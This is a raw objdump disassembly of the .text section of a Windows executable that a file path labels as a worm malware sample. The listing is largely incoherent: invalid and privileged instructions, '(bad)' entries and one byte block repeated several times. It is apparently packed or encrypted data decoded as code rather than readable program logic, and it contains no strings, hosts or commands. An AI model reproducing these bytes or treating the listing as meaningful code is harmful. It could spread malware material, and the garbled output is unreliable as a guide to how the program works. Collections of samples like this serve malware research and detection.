
malware_samples/worm/b82b7a6c942551964c3bd0b159dc4af1fb7deb945476183279092328228bd7a9.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	ea 30 f0 8b a5 0a 90 	ljmp   $0x900a,$0xa58bf030
  401007:	90                   	nop
  401008:	14 c3                	adc    $0xc3,%al
  40100a:	95                   	xchg   %eax,%ebp
  40100b:	1d 32 08 21 c7       	sbb    $0xc7210832,%eax
  401010:	0a a9 5e 80 c9 e5    	or     -0x1a367fa2(%ecx),%ch
  401016:	9b                   	fwait
  401017:	bd cb d3 2c e8       	mov    $0xe82cd3cb,%ebp
  40101c:	91                   	xchg   %eax,%ecx
  40101d:	98                   	cwtl
  40101e:	f1                   	int1
  40101f:	10 d7                	adc    %dl,%bh
  401021:	41                   	inc    %ecx
  401022:	dd a0 a0 6a 8c 36    	frstor 0x368c6aa0(%eax)
  401028:	b8 05 8f f1 68       	mov    $0x68f18f05,%eax
  40102d:	c5 ad 19 90 9a ee    	lds    -0x11656fe7(%ebp),%ebp
  401033:	3c 33                	cmp    $0x33,%al
  401035:	f2 f9                	repnz stc
  401037:	04 ba                	add    $0xba,%al
  401039:	fa                   	cli
  40103a:	4c                   	dec    %esp
  40103b:	10 84 59 c3 1b 8c 79 	adc    %al,0x798c1bc3(%ecx,%ebx,2)
  401042:	9a 1c 04 a7 e0 79 16 	lcall  $0x1679,$0xe0a7041c
  401049:	6b 77 2e 37          	imul   $0x37,0x2e(%edi),%esi
  40104d:	89 da                	mov    %ebx,%edx
  40104f:	d1 37                	shll   $1,(%edi)
  401051:	6a 3a                	push   $0x3a
  401053:	9c                   	pushf
  401054:	d5 78                	aad    $0x78
  401056:	1a c1                	sbb    %cl,%al
  401058:	43                   	inc    %ebx
  401059:	f3 ab                	rep stos %eax,%es:(%edi)
  40105b:	b7 d6                	mov    $0xd6,%bh
  40105d:	d5 57                	aad    $0x57
  40105f:	57                   	push   %edi
  401060:	06                   	push   %es
  401061:	f2 3f                	repnz aas
  401063:	44                   	inc    %esp
  401064:	d3 eb                	shr    %cl,%ebx
  401066:	35 b6 df 1e f2       	xor    $0xf21edfb6,%eax
  40106b:	12 94 76 c2 3b 1a c5 	adc    -0x3ae5c43e(%esi,%esi,2),%dl
  401072:	5d                   	pop    %ebp
  401073:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401074:	e2 e0                	loop   0x401056
  401076:	3f                   	aas
  401077:	41                   	inc    %ecx
  401078:	8b 72 4b             	mov    0x4b(%edx),%esi
  40107b:	27                   	daa
  40107c:	6c                   	insb   (%dx),%es:(%edi)
  40107d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40107e:	33 69 5c             	xor    0x5c(%ecx),%ebp
  401081:	30 aa b0 0f 5f 4a    	xor    %ch,0x4a5f0fb0(%edx)
  401087:	6f                   	outsl  %ds:(%esi),(%dx)
  401088:	7a ca                	jp     0x401054
  40108a:	3f                   	aas
  40108b:	03 1a                	add    (%edx),%ebx
  40108d:	88 70 31             	mov    %dh,0x31(%eax)
  401090:	62 8f 73 76 f0 15    	bound  %ecx,0x15f07673(%edi)
  401096:	4f                   	dec    %edi
  401097:	f7 4f 72 37 42 49 4b 	testl  $0x4b494237,0x72(%edi)
  40109e:	6b 7e 88 90          	imul   $0xffffff90,-0x78(%esi),%edi
  4010a2:	47                   	inc    %edi
  4010a3:	2c 5b                	sub    $0x5b,%al
  4010a5:	96                   	xchg   %eax,%esi
  4010a6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4010a7:	5c                   	pop    %esp
  4010a8:	0a 50 8e             	or     -0x72(%eax),%dl
  4010ab:	6c                   	insb   (%dx),%es:(%edi)
  4010ac:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4010ad:	34 88                	xor    $0x88,%al
  4010af:	57                   	push   %edi
  4010b0:	cf                   	iret
  4010b1:	c9                   	leave
  4010b2:	90                   	nop
  4010b3:	b9 aa 50 33 50       	mov    $0x503350aa,%ecx
  4010b8:	20 0f                	and    %cl,(%edi)
  4010ba:	cc                   	int3
  4010bb:	31 23                	xor    %esp,(%ebx)
  4010bd:	30 d0                	xor    %dl,%al
  4010bf:	eb 56                	jmp    0x401117
  4010c1:	88 25 27 ca 92 0c    	mov    %ah,0xc92ca27
  4010c7:	db 7b 7e             	fstpt  0x7e(%ebx)
  4010ca:	d8 bd 50 af 9d 82    	fdivrs -0x7d6250b0(%ebp)
  4010d0:	be 0b 3e 36 8d       	mov    $0x8d363e0b,%esi
  4010d5:	fd                   	std
  4010d6:	f2 4f                	repnz dec %edi
  4010d8:	e6 aa                	out    %al,$0xaa
  4010da:	15 7a b9 87 cb       	adc    $0xcb87b97a,%eax
  4010df:	f2 05 d4 07 63 8a    	repnz add $0x8a6307d4,%eax
  4010e5:	9c                   	pushf
  4010e6:	8e 01                	mov    (%ecx),%es
  4010e8:	33 97 10 6b a4 aa    	xor    -0x555b94f0(%edi),%edx
  4010ee:	7c c8                	jl     0x4010b8
  4010f0:	e3 25                	jecxz  0x401117
  4010f2:	e8 9a b5 26 fb       	call   0xfb66c691
  4010f7:	f3 40                	repz inc %eax
  4010f9:	68 d6 75 c5 d0       	push   $0xd0c575d6
  4010fe:	9c                   	pushf
  4010ff:	b4 a6                	mov    $0xa6,%ah
  401101:	6d                   	insl   (%dx),%es:(%edi)
  401102:	f6 db                	neg    %bl
  401104:	73 79                	jae    0x40117f
  401106:	01 a9 c3 57 96 56    	add    %ebp,0x569657c3(%ecx)
  40110c:	85 11                	test   %edx,(%ecx)
  40110e:	90                   	nop
  40110f:	00 80 31 13 1c 18    	add    %al,0x181c1331(%eax)
  401115:	21 f9                	and    %edi,%ecx
  401117:	70 61                	jo     0x40117a
  401119:	6c                   	insb   (%dx),%es:(%edi)
  40111a:	9b                   	fwait
  40111b:	56                   	push   %esi
  40111c:	bf 37 e6 3f c3       	mov    $0xc33fe637,%edi
  401121:	85 b8 d3 18 49 50    	test   %edi,0x504918d3(%eax)
  401127:	a0 c0 32 c9 63       	mov    0x63c932c0,%al
  40112c:	be 68 b9 c4 bb       	mov    $0xbbc4b968,%esi
  401131:	c1 aa 07 da 2f b4 77 	shrl   $0x77,-0x4bd025f9(%edx)
  401138:	c6                   	(bad)
  401139:	5f                   	pop    %edi
  40113a:	f6 a6 4d bd 22 ab    	mulb   -0x54dd42b3(%esi)
  401140:	f2 98                	repnz cwtl
  401142:	85 b0 8f e1 13 2c    	test   %esi,0x2c13e18f(%eax)
  401148:	67 d1 88 3c 51       	rorl   $1,0x513c(%bx,%si)
  40114d:	4c                   	dec    %esp
  40114e:	02 10                	add    (%eax),%dl
  401150:	bc 31 21 1e 35       	mov    $0x351e2131,%esp
  401155:	d2 c5                	rol    %cl,%ch
  401157:	53                   	push   %ebx
  401158:	af                   	scas   %es:(%edi),%eax
  401159:	c6                   	(bad)
  40115a:	92                   	xchg   %eax,%edx
  40115b:	da 25 f0 d9 6e 77    	fisubl 0x776ed9f0
  401161:	73 e5                	jae    0x401148
  401163:	c7                   	(bad)
  401164:	60                   	pusha
  401165:	de d6                	(bad)
  401167:	26 b6 dc             	es mov $0xdc,%dh
  40116a:	f1                   	int1
  40116b:	8c 55 1d             	mov    %ss,0x1d(%ebp)
  40116e:	6b 2a a3             	imul   $0xffffffa3,(%edx),%ebp
  401171:	f8                   	clc
  401172:	7f 7b                	jg     0x4011ef
  401174:	b0 da                	mov    $0xda,%al
  401176:	62 df 00             	(bad) {%k3}{z}
  401179:	c3                   	ret
  40117a:	dc 5b 66             	fcompl 0x66(%ebx)
  40117d:	7a 8a                	jp     0x401109
  40117f:	3c ba                	cmp    $0xba,%al
  401181:	97                   	xchg   %eax,%edi
  401182:	af                   	scas   %es:(%edi),%eax
  401183:	9d                   	popf
  401184:	1d 6c ed 6f a3       	sbb    $0xa36fed6c,%eax
  401189:	5e                   	pop    %esi
  40118a:	5f                   	pop    %edi
  40118b:	c3                   	ret
  40118c:	52                   	push   %edx
  40118d:	e4 af                	in     $0xaf,%al
  40118f:	7a eb                	jp     0x40117c
  401191:	4f                   	dec    %edi
  401192:	fa                   	cli
  401193:	94                   	xchg   %eax,%esp
  401194:	b8 ec 6f 1d eb       	mov    $0xeb1d6fec,%eax
  401199:	23 e5                	and    %ebp,%esp
  40119b:	d2 c3                	rol    %cl,%bl
  40119d:	d8 22                	fsubs  (%edx)
  40119f:	ad                   	lods   %ds:(%esi),%eax
  4011a0:	d9 16                	fsts   (%esi)
  4011a2:	47                   	inc    %edi
  4011a3:	5f                   	pop    %edi
  4011a4:	1c 7d                	sbb    $0x7d,%al
  4011a6:	0c 8b                	or     $0x8b,%al
  4011a8:	03 bc b1 01 e2 56 a5 	add    -0x5aa91dff(%ecx,%esi,4),%edi
  4011af:	6c                   	insb   (%dx),%es:(%edi)
  4011b0:	78 41                	js     0x4011f3
  4011b2:	61                   	popa
  4011b3:	21 5d d0             	and    %ebx,-0x30(%ebp)
  4011b6:	5f                   	pop    %edi
  4011b7:	16                   	push   %ss
  4011b8:	20 1e                	and    %bl,(%esi)
  4011ba:	92                   	xchg   %eax,%edx
  4011bb:	7e 31                	jle    0x4011ee
  4011bd:	95                   	xchg   %eax,%ebp
  4011be:	fb                   	sti
  4011bf:	ca cb 44             	lret   $0x44cb
  4011c2:	06                   	push   %es
  4011c3:	19 26                	sbb    %esp,(%esi)
  4011c5:	d8 0c 73             	fmuls  (%ebx,%esi,2)
  4011c8:	4f                   	dec    %edi
  4011c9:	7e f2                	jle    0x4011bd
  4011cb:	bd 50 a6 37 1d       	mov    $0x1d37a650,%ebp
  4011d0:	ce                   	into
  4011d1:	66 80 25 8d dc 09 8f 	data16 andb $0x1f,0x8f09dc8d
  4011d8:	1f 
  4011d9:	1b f2                	sbb    %edx,%esi
  4011db:	7a e0                	jp     0x4011bd
  4011dd:	87 26                	xchg   %esp,(%esi)
  4011df:	c6                   	(bad)
  4011e0:	b7 37                	mov    $0x37,%bh
  4011e2:	07                   	pop    %es
  4011e3:	63 b9 9c 8e 01 33    	arpl   %edi,0x33018e9c(%ecx)
  4011e9:	de 10                	ficoms (%eax)
  4011eb:	6b aa aa 44 c8 e3 25 	imul   $0x25,-0x1c37bb56(%edx),%ebp
  4011f2:	e8 33 b5 26 fb       	call   0xfb66c72a
  4011f7:	f3 40                	repz inc %eax
  4011f9:	68 d6 75 fb d0       	push   $0xd0fb75d6
  4011fe:	9c                   	pushf
  4011ff:	b4 20                	mov    $0x20,%ah
  401201:	6d                   	insl   (%dx),%es:(%edi)
  401202:	a3 32 73 bd 01       	mov    %eax,0x1bd7332
  401207:	a9 ec 57 82 56       	test   $0x568257ec,%eax
  40120c:	85 87 a8 08 bf 31    	test   %eax,0x31bf08a8(%edi)
  401212:	ce                   	into
  401213:	fd                   	std
  401214:	9c                   	pushf
  401215:	21 48 e6             	and    %ecx,-0x1a(%eax)
  401218:	61                   	popa
  401219:	6c                   	insb   (%dx),%es:(%edi)
  40121a:	9b                   	fwait
  40121b:	56                   	push   %esi
  40121c:	bf 37 89 3f c3       	mov    $0xc33f8937,%edi
  401221:	85 b8 d3 42 91 50    	test   %edi,0x509142d3(%eax)
  401227:	59                   	pop    %ecx
  401228:	94                   	xchg   %eax,%esp
  401229:	32 c9                	xor    %cl,%cl
  40122b:	63 be 25 b9 c4 bb    	arpl   %edi,-0x443b46db(%esi)
  401231:	c1 aa 8a da 2f b4 77 	shrl   $0x77,-0x4bd02576(%edx)
  401238:	4c                   	dec    %esp
  401239:	6a f6                	push   $0xfffffff6
  40123b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40123c:	4d                   	dec    %ebp
  40123d:	2e 22 ab f2 98 85 b0 	and    %cs:-0x4f7a670e(%ebx),%ch
  401244:	8f                   	(bad)
  401245:	e1 13                	loope  0x40125a
  401247:	2c 67                	sub    $0x67,%al
  401249:	d1 4f 3c             	rorl   $1,0x3c(%edi)
  40124c:	51                   	push   %ecx
  40124d:	4c                   	dec    %esp
  40124e:	02 10                	add    (%eax),%dl
  401250:	bc 31 21 1e 35       	mov    $0x351e2131,%esp
  401255:	d2 c5                	rol    %cl,%ch
  401257:	53                   	push   %ebx
  401258:	af                   	scas   %es:(%edi),%eax
  401259:	c6                   	(bad)
  40125a:	92                   	xchg   %eax,%edx
  40125b:	da 25 f0 d9 6e 77    	fisubl 0x776ed9f0
  401261:	73 e5                	jae    0x401248
  401263:	c7                   	(bad)
  401264:	60                   	pusha
  401265:	de d6                	(bad)
  401267:	26 b6 dc             	es mov $0xdc,%dh
  40126a:	f1                   	int1
  40126b:	8c 55 1d             	mov    %ss,0x1d(%ebp)
  40126e:	6b 2a a3             	imul   $0xffffffa3,(%edx),%ebp
  401271:	f8                   	clc
  401272:	7f 7b                	jg     0x4012ef
  401274:	b0 da                	mov    $0xda,%al
  401276:	62 df 00             	(bad) {%k3}{z}
  401279:	c3                   	ret
  40127a:	dc 5b 66             	fcompl 0x66(%ebx)
  40127d:	7a 0b                	jp     0x40128a
  40127f:	3c ba                	cmp    $0xba,%al
  401281:	36 af                	ss scas %es:(%edi),%eax
  401283:	9d                   	popf
  401284:	1d 6c ed 6f a3       	sbb    $0xa36fed6c,%eax
  401289:	5e                   	pop    %esi
  40128a:	5f                   	pop    %edi
  40128b:	c3                   	ret
  40128c:	52                   	push   %edx
  40128d:	e4 af                	in     $0xaf,%al
  40128f:	7a eb                	jp     0x40127c
  401291:	4f                   	dec    %edi
  401292:	fa                   	cli
  401293:	94                   	xchg   %eax,%esp
  401294:	b8 ec 6f 1d eb       	mov    $0xeb1d6fec,%eax
  401299:	23 e5                	and    %ebp,%esp
  40129b:	d2 c3                	rol    %cl,%bl
  40129d:	d8 22                	fsubs  (%edx)
  40129f:	ad                   	lods   %ds:(%esi),%eax
  4012a0:	d9 16                	fsts   (%esi)
  4012a2:	47                   	inc    %edi
  4012a3:	5f                   	pop    %edi
  4012a4:	1c 7d                	sbb    $0x7d,%al
  4012a6:	0c 8b                	or     $0x8b,%al
  4012a8:	03 bc b1 01 e2 56 a5 	add    -0x5aa91dff(%ecx,%esi,4),%edi
  4012af:	6c                   	insb   (%dx),%es:(%edi)
  4012b0:	78 41                	js     0x4012f3
  4012b2:	61                   	popa
  4012b3:	21 5d d0             	and    %ebx,-0x30(%ebp)
  4012b6:	5f                   	pop    %edi
  4012b7:	16                   	push   %ss
  4012b8:	20 1e                	and    %bl,(%esi)
  4012ba:	92                   	xchg   %eax,%edx
  4012bb:	7e 31                	jle    0x4012ee
  4012bd:	95                   	xchg   %eax,%ebp
  4012be:	fb                   	sti
  4012bf:	ca cb 44             	lret   $0x44cb
  4012c2:	06                   	push   %es
  4012c3:	19 26                	sbb    %esp,(%esi)
  4012c5:	d8 0c 73             	fmuls  (%ebx,%esi,2)
  4012c8:	4f                   	dec    %edi
  4012c9:	7e f2                	jle    0x4012bd
  4012cb:	bd 50 a6 37 1d       	mov    $0x1d37a650,%ebp
  4012d0:	ce                   	into
  4012d1:	66 80 25 8d dc 09 8f 	data16 andb $0x1f,0x8f09dc8d
  4012d8:	1f 
  4012d9:	1b f2                	sbb    %edx,%esi
  4012db:	7a e0                	jp     0x4012bd
  4012dd:	87 26                	xchg   %esp,(%esi)
  4012df:	c6                   	(bad)
  4012e0:	b7 37                	mov    $0x37,%bh
  4012e2:	07                   	pop    %es
  4012e3:	63 b9 9c 8e 01 33    	arpl   %edi,0x33018e9c(%ecx)
  4012e9:	de 10                	ficoms (%eax)
  4012eb:	6b aa aa 44 c8 e3 25 	imul   $0x25,-0x1c37bb56(%edx),%ebp
  4012f2:	e8 33 b5 26 fb       	call   0xfb66c82a
  4012f7:	f3 40                	repz inc %eax
  4012f9:	68 d6 75 fb d0       	push   $0xd0fb75d6
  4012fe:	9c                   	pushf
  4012ff:	b4 20                	mov    $0x20,%ah
  401301:	6d                   	insl   (%dx),%es:(%edi)
  401302:	a3 32 73 bd 01       	mov    %eax,0x1bd7332
  401307:	a9 ec 57 82 56       	test   $0x568257ec,%eax
  40130c:	85 87 a8 08 bf 31    	test   %eax,0x31bf08a8(%edi)
  401312:	ce                   	into
  401313:	fd                   	std
  401314:	9c                   	pushf
  401315:	21 48 e6             	and    %ecx,-0x1a(%eax)
  401318:	61                   	popa
  401319:	6c                   	insb   (%dx),%es:(%edi)
  40131a:	9b                   	fwait
  40131b:	56                   	push   %esi
  40131c:	bf 37 89 3f c3       	mov    $0xc33f8937,%edi
  401321:	85 b8 d3 42 91 50    	test   %edi,0x509142d3(%eax)
  401327:	59                   	pop    %ecx
  401328:	94                   	xchg   %eax,%esp
  401329:	32 c9                	xor    %cl,%cl
  40132b:	63 be 25 b9 c4 bb    	arpl   %edi,-0x443b46db(%esi)
  401331:	c1 aa 8a da 2f b4 77 	shrl   $0x77,-0x4bd02576(%edx)
  401338:	4c                   	dec    %esp
  401339:	6a f6                	push   $0xfffffff6
  40133b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40133c:	4d                   	dec    %ebp
  40133d:	2e 22 ab f2 98 85 b0 	and    %cs:-0x4f7a670e(%ebx),%ch
  401344:	8f                   	(bad)
  401345:	e1 13                	loope  0x40135a
  401347:	2c 67                	sub    $0x67,%al
  401349:	d1 4f 3c             	rorl   $1,0x3c(%edi)
  40134c:	51                   	push   %ecx
  40134d:	4c                   	dec    %esp
  40134e:	02 10                	add    (%eax),%dl
  401350:	bc 31 21 1e 35       	mov    $0x351e2131,%esp
  401355:	d2 c5                	rol    %cl,%ch
  401357:	53                   	push   %ebx
  401358:	af                   	scas   %es:(%edi),%eax
  401359:	c6                   	(bad)
  40135a:	92                   	xchg   %eax,%edx
  40135b:	da 25 f0 d9 6e 77    	fisubl 0x776ed9f0
  401361:	73 e5                	jae    0x401348
  401363:	c7                   	(bad)
  401364:	60                   	pusha
  401365:	de d6                	(bad)
  401367:	26 b6 dc             	es mov $0xdc,%dh
  40136a:	f1                   	int1
  40136b:	8c 55 1d             	mov    %ss,0x1d(%ebp)
  40136e:	6b 2a a3             	imul   $0xffffffa3,(%edx),%ebp
  401371:	f8                   	clc
  401372:	7f 7b                	jg     0x4013ef
  401374:	b0 da                	mov    $0xda,%al
  401376:	62 df 00             	(bad) {%k3}{z}
  401379:	c3                   	ret
  40137a:	dc 5b 66             	fcompl 0x66(%ebx)
  40137d:	7a 0b                	jp     0x40138a
  40137f:	3c ba                	cmp    $0xba,%al
  401381:	36 af                	ss scas %es:(%edi),%eax
  401383:	9d                   	popf
  401384:	1d 6c ed 6f a3       	sbb    $0xa36fed6c,%eax
  401389:	5e                   	pop    %esi
  40138a:	5f                   	pop    %edi
  40138b:	c3                   	ret
  40138c:	52                   	push   %edx
  40138d:	e4 af                	in     $0xaf,%al
  40138f:	7a eb                	jp     0x40137c
  401391:	4f                   	dec    %edi
  401392:	fa                   	cli
  401393:	94                   	xchg   %eax,%esp
  401394:	b8 ec 6f 1d eb       	mov    $0xeb1d6fec,%eax
  401399:	23 e5                	and    %ebp,%esp
  40139b:	d2 c3                	rol    %cl,%bl
  40139d:	d8 22                	fsubs  (%edx)
  40139f:	ad                   	lods   %ds:(%esi),%eax
  4013a0:	d9 16                	fsts   (%esi)
  4013a2:	47                   	inc    %edi
  4013a3:	5f                   	pop    %edi
  4013a4:	1c 7d                	sbb    $0x7d,%al
  4013a6:	0c 8b                	or     $0x8b,%al
  4013a8:	03 bc b1 01 e2 56 a5 	add    -0x5aa91dff(%ecx,%esi,4),%edi
  4013af:	6c                   	insb   (%dx),%es:(%edi)
  4013b0:	78 41                	js     0x4013f3
  4013b2:	61                   	popa
  4013b3:	21 5d d0             	and    %ebx,-0x30(%ebp)
  4013b6:	5f                   	pop    %edi
  4013b7:	16                   	push   %ss
  4013b8:	20 1e                	and    %bl,(%esi)
  4013ba:	92                   	xchg   %eax,%edx
  4013bb:	7e 31                	jle    0x4013ee
  4013bd:	95                   	xchg   %eax,%ebp
  4013be:	fb                   	sti
  4013bf:	ca cb 44             	lret   $0x44cb
  4013c2:	06                   	push   %es
  4013c3:	19 26                	sbb    %esp,(%esi)
  4013c5:	d8 0c 73             	fmuls  (%ebx,%esi,2)
  4013c8:	4f                   	dec    %edi
  4013c9:	7e f2                	jle    0x4013bd
  4013cb:	bd 50 a6 37 1d       	mov    $0x1d37a650,%ebp
  4013d0:	ce                   	into
  4013d1:	66 80 25 8d dc 09 8f 	data16 andb $0x1f,0x8f09dc8d
  4013d8:	1f 
  4013d9:	1b f2                	sbb    %edx,%esi
  4013db:	7a e0                	jp     0x4013bd
  4013dd:	87 26                	xchg   %esp,(%esi)
  4013df:	c6                   	(bad)
  4013e0:	b7 37                	mov    $0x37,%bh
  4013e2:	07                   	pop    %es
  4013e3:	63 b9 9c 8e 01 33    	arpl   %edi,0x33018e9c(%ecx)
  4013e9:	de 10                	ficoms (%eax)
  4013eb:	6b aa aa 44 c8 e3 25 	imul   $0x25,-0x1c37bb56(%edx),%ebp
  4013f2:	e8 33 b5 26 fb       	call   0xfb66c92a
  4013f7:	f3 40                	repz inc %eax
  4013f9:	68 d6 75 fb d0       	push   $0xd0fb75d6
  4013fe:	9c                   	pushf
  4013ff:	b4 20                	mov    $0x20,%ah
  401401:	6d                   	insl   (%dx),%es:(%edi)
  401402:	a3 32 73 bd 01       	mov    %eax,0x1bd7332
  401407:	a9 ec 57 82 56       	test   $0x568257ec,%eax
  40140c:	85 87 a8 08 bf 31    	test   %eax,0x31bf08a8(%edi)
  401412:	ce                   	into
  401413:	fd                   	std
  401414:	9c                   	pushf
  401415:	21 48 e6             	and    %ecx,-0x1a(%eax)
  401418:	61                   	popa
  401419:	6c                   	insb   (%dx),%es:(%edi)
  40141a:	9b                   	fwait
  40141b:	56                   	push   %esi
  40141c:	bf 37 89 3f c3       	mov    $0xc33f8937,%edi
  401421:	85 b8 d3 42 91 50    	test   %edi,0x509142d3(%eax)
  401427:	59                   	pop    %ecx
  401428:	94                   	xchg   %eax,%esp
  401429:	32 c9                	xor    %cl,%cl
  40142b:	63 be 25 b9 c4 bb    	arpl   %edi,-0x443b46db(%esi)
  401431:	c1 aa 8a da 2f b4 77 	shrl   $0x77,-0x4bd02576(%edx)
  401438:	4c                   	dec    %esp
  401439:	6a f6                	push   $0xfffffff6
  40143b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40143c:	4d                   	dec    %ebp
  40143d:	2e 22 ab f2 98 85 b0 	and    %cs:-0x4f7a670e(%ebx),%ch
  401444:	8f                   	(bad)
  401445:	e1 13                	loope  0x40145a
  401447:	2c 67                	sub    $0x67,%al
  401449:	d1 4f 3c             	rorl   $1,0x3c(%edi)
  40144c:	51                   	push   %ecx
  40144d:	4c                   	dec    %esp
  40144e:	02 10                	add    (%eax),%dl
  401450:	bc 31 21 1e 35       	mov    $0x351e2131,%esp
  401455:	d2 c5                	rol    %cl,%ch
  401457:	53                   	push   %ebx
  401458:	af                   	scas   %es:(%edi),%eax
  401459:	c6                   	(bad)
  40145a:	92                   	xchg   %eax,%edx
  40145b:	da 25 f0 d9 6e 77    	fisubl 0x776ed9f0
  401461:	73 e5                	jae    0x401448
  401463:	c7                   	(bad)
  401464:	60                   	pusha
  401465:	de d6                	(bad)
  401467:	26 b6 dc             	es mov $0xdc,%dh
  40146a:	f1                   	int1
  40146b:	8c 55 1d             	mov    %ss,0x1d(%ebp)
  40146e:	6b 2a a3             	imul   $0xffffffa3,(%edx),%ebp
  401471:	f8                   	clc
  401472:	7f 7b                	jg     0x4014ef
  401474:	b0 da                	mov    $0xda,%al
  401476:	62 df 00             	(bad) {%k3}{z}
  401479:	c3                   	ret
  40147a:	dc 5b 66             	fcompl 0x66(%ebx)
  40147d:	7a 0b                	jp     0x40148a
  40147f:	3c ba                	cmp    $0xba,%al
  401481:	36 af                	ss scas %es:(%edi),%eax
  401483:	9d                   	popf
  401484:	1d 6c ed 6f a3       	sbb    $0xa36fed6c,%eax
  401489:	5e                   	pop    %esi
  40148a:	5f                   	pop    %edi
  40148b:	c3                   	ret
  40148c:	52                   	push   %edx
  40148d:	e4 af                	in     $0xaf,%al
  40148f:	7a eb                	jp     0x40147c
  401491:	4f                   	dec    %edi
  401492:	fa                   	cli
  401493:	94                   	xchg   %eax,%esp
  401494:	b8 ec 6f 1d eb       	mov    $0xeb1d6fec,%eax
  401499:	23 e5                	and    %ebp,%esp
  40149b:	d2 c3                	rol    %cl,%bl
  40149d:	d8 22                	fsubs  (%edx)
  40149f:	ad                   	lods   %ds:(%esi),%eax
  4014a0:	d9 16                	fsts   (%esi)
  4014a2:	47                   	inc    %edi
  4014a3:	5f                   	pop    %edi
  4014a4:	1c 7d                	sbb    $0x7d,%al
  4014a6:	0c 8b                	or     $0x8b,%al
  4014a8:	03 bc b1 01 e2 56 a5 	add    -0x5aa91dff(%ecx,%esi,4),%edi
  4014af:	6c                   	insb   (%dx),%es:(%edi)
  4014b0:	78 41                	js     0x4014f3
  4014b2:	61                   	popa
  4014b3:	21 5d d0             	and    %ebx,-0x30(%ebp)
  4014b6:	5f                   	pop    %edi
  4014b7:	16                   	push   %ss
  4014b8:	20 1e                	and    %bl,(%esi)
  4014ba:	92                   	xchg   %eax,%edx
  4014bb:	7e 31                	jle    0x4014ee
  4014bd:	95                   	xchg   %eax,%ebp
  4014be:	fb                   	sti
  4014bf:	ca cb 44             	lret   $0x44cb
  4014c2:	06                   	push   %es
  4014c3:	19 26                	sbb    %esp,(%esi)
  4014c5:	d8 0c 73             	fmuls  (%ebx,%esi,2)
  4014c8:	4f                   	dec    %edi
  4014c9:	7e f2                	jle    0x4014bd
  4014cb:	bd 50 a6 37 1d       	mov    $0x1d37a650,%ebp
  4014d0:	ce                   	into
  4014d1:	66 80 25 8d dc 09 8f 	data16 andb $0x1f,0x8f09dc8d
  4014d8:	1f 
  4014d9:	1b f2                	sbb    %edx,%esi
  4014db:	7a e0                	jp     0x4014bd
  4014dd:	87 26                	xchg   %esp,(%esi)
  4014df:	c6                   	(bad)
  4014e0:	b7 37                	mov    $0x37,%bh
  4014e2:	07                   	pop    %es
  4014e3:	63 b9 9c 8e 01 33    	arpl   %edi,0x33018e9c(%ecx)
  4014e9:	de 10                	ficoms (%eax)
  4014eb:	6b aa aa 44 c8 e3 25 	imul   $0x25,-0x1c37bb56(%edx),%ebp
  4014f2:	e8 33 b5 26 fb       	call   0xfb66ca2a
  4014f7:	f3 40                	repz inc %eax
  4014f9:	68 d6 75 fb d0       	push   $0xd0fb75d6
  4014fe:	9c                   	pushf
  4014ff:	b4 20                	mov    $0x20,%ah
  401501:	6d                   	insl   (%dx),%es:(%edi)
  401502:	a3 32 73 bd 01       	mov    %eax,0x1bd7332
  401507:	a9 ec 57 82 56       	test   $0x568257ec,%eax
  40150c:	85 87 a8 08 bf 31    	test   %eax,0x31bf08a8(%edi)
  401512:	ce                   	into
  401513:	fd                   	std
  401514:	9c                   	pushf
  401515:	21 48 e6             	and    %ecx,-0x1a(%eax)
  401518:	61                   	popa
  401519:	6c                   	insb   (%dx),%es:(%edi)
  40151a:	9b                   	fwait
  40151b:	56                   	push   %esi
  40151c:	bf 37 89 3f c3       	mov    $0xc33f8937,%edi
  401521:	85 b8 d3 42 91 50    	test   %edi,0x509142d3(%eax)
  401527:	59                   	pop    %ecx
  401528:	94                   	xchg   %eax,%esp
  401529:	32 c9                	xor    %cl,%cl
  40152b:	63 be 25 b9 c4 bb    	arpl   %edi,-0x443b46db(%esi)
  401531:	c1 aa 8a da 2f b4 77 	shrl   $0x77,-0x4bd02576(%edx)
  401538:	4c                   	dec    %esp
  401539:	6a f6                	push   $0xfffffff6
  40153b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40153c:	4d                   	dec    %ebp
  40153d:	2e 22 ab f2 98 85 b0 	and    %cs:-0x4f7a670e(%ebx),%ch
  401544:	8f                   	(bad)
  401545:	e1 13                	loope  0x40155a
  401547:	2c 67                	sub    $0x67,%al
  401549:	d1 4f 3c             	rorl   $1,0x3c(%edi)
  40154c:	51                   	push   %ecx
  40154d:	4c                   	dec    %esp
  40154e:	02 10                	add    (%eax),%dl
  401550:	bc 31 21 1e 35       	mov    $0x351e2131,%esp
  401555:	d2 c5                	rol    %cl,%ch
  401557:	53                   	push   %ebx
  401558:	af                   	scas   %es:(%edi),%eax
  401559:	c6                   	(bad)
  40155a:	92                   	xchg   %eax,%edx
  40155b:	da 25 f0 d9 6e 77    	fisubl 0x776ed9f0
  401561:	73 e5                	jae    0x401548
  401563:	c7                   	(bad)
  401564:	60                   	pusha
  401565:	de d6                	(bad)
  401567:	26 b6 dc             	es mov $0xdc,%dh
  40156a:	f1                   	int1
  40156b:	8c 55 1d             	mov    %ss,0x1d(%ebp)
  40156e:	6b 2a a3             	imul   $0xffffffa3,(%edx),%ebp
  401571:	f8                   	clc
  401572:	7f 7b                	jg     0x4015ef
  401574:	b0 da                	mov    $0xda,%al
  401576:	62 df 00             	(bad) {%k3}{z}
  401579:	c3                   	ret
  40157a:	dc 5b 66             	fcompl 0x66(%ebx)
  40157d:	7a 0b                	jp     0x40158a
  40157f:	3c ba                	cmp    $0xba,%al
  401581:	36 af                	ss scas %es:(%edi),%eax
  401583:	9d                   	popf
  401584:	1d 6c ed 6f a3       	sbb    $0xa36fed6c,%eax
  401589:	5e                   	pop    %esi
  40158a:	5f                   	pop    %edi
  40158b:	c3                   	ret
  40158c:	52                   	push   %edx
  40158d:	e4 af                	in     $0xaf,%al
  40158f:	7a eb                	jp     0x40157c
  401591:	4f                   	dec    %edi
  401592:	fa                   	cli
  401593:	94                   	xchg   %eax,%esp
  401594:	b8 ec 6f 1d eb       	mov    $0xeb1d6fec,%eax
  401599:	23 e5                	and    %ebp,%esp
  40159b:	d2 c3                	rol    %cl,%bl
